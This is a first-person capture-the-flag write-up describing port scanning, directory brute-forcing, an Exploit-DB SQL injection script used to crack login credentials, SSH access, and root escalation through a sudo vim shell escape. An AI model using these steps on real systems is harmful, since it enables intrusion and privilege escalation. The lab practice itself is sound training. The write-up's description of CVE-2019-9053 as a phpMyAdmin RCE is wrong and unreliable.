To find the services running under port 1000 i did this command:

nmap -p1-1000 10.10.172.58



But before that I tried:
nmap -sV -sT 10.10.172.58

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel




Then after running gobuster:
/simple               (Status: 301) [Size: 313] [--> http://10.10.172.58/simple/]


I went to that page and found and link to log in:
http://10.10.172.58/simple/admin/login.php



After some research I found the CVE: CVE-2019-9053
CVE-2019-9053 is a Remote Code Execution (RCE) vulnerability found in phpMyAdmin versions prior to 4.8.5. 
It was discovered in February 2019 and involves unsanitized user input in the sql.php script that can be exploited to perform time-based blind SQL injection.



I found the script to exploit this vulnerability in: https://www.exploit-db.com/exploits/46635
But the script had some errors that I had to correct.
I ran the script with the wordlist provided:
python3 py.py -u http://10.10.172.58 --crack -w best110.txt

And I was able to get the password and user.

First I logged into the website but found no major things so the next question helped me to figure out that I had to log in using ssh through port 2222

ssh user@<target_ip> -p 2222





I found another user to asnwer one question with:
cat /etc/passwd


After that I had to use privilege escalation.
So I ran:
find / -perm -4000 2>/dev/null

I didn't find anything interesting so I decided to ran another command I should've ran first:
sudo -l

$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim


I investigated on: https://gtfobins.github.io/gtfobins/vim/
And found this command:
vim -c ':!/bin/sh'

But I had to ran as sudo for it to work:
sudo vim -c ':!/bin/sh'


After that I searched for the flag in the usual suspect directory:
/root

And I found the flag!
